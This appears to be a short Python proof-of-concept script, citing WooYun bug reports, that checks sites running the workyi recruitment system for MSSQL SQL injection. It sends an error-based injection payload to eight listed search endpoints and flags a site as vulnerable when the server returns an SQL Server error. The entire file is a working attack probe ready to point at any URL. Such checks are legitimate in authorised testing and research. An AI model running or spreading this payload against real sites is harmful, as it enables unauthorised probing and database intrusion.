#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: workyi人才系统多处注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0115124
         http://www.wooyun.org/bugs/wooyun-2010-0115157
author: Lucifer
description: 多处存在mssql SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        urls = ["/persondh/urgent.aspx?key=",
                "/persondh/highsalary.aspx?key=",
                "/persondh/parttime.aspx?key=",
                "/companydh/latest.aspx?key=",
                "/companydh/vip.aspx?key=",
                "/companydh/picture.aspx?key=",
                "/companydh/recommand.aspx?key=",
                "/companydh/parttime.aspx?key="]
        payload = "%27AnD%20@@VeRsIon>0%20Or%27%%27=%27%"
        try:
            noexist = True
            for turl in urls:
                vulnurl = url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
                    result[1]=  '存在'
                    result[0] = vulnurl
                    noexist = False
            if noexist:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    